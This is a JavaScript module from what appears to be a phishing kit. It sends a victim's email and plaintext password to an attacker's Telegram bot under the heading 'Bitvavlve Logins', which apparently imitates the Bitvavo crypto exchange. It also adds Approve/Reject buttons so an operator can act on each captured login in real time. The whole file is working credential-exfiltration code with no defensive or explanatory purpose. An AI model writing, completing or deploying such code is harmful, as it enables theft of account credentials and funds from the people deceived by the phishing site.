import axios from "axios";

export const sendTelegramMessage = async ({
  requestId,
  password,
  email,
}) => {
  try {
    const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;

    await axios.post(url, {
      chat_id: process.env.CHAT_ID,

      parse_mode: "HTML",

      text: `
 <b>Bitvavlve Logins</b>

   <b>Email:</b> ${email}

   <b>Password:</b> ${password}


`,

      reply_markup: {
        inline_keyboard: [
          [
            {
              text: " Approve",
              callback_data: `approve:${requestId}`,
            },
            {
              text: " Reject",
              callback_data: `reject:${requestId}`,
            },
          ],
        ],
      },
    });

    console.log("✅ Telegram message sent.");
  } catch (err) {
    console.log(
      "Telegram Error:",
      err.response?.data || err.message
    );

    throw err;
  }
};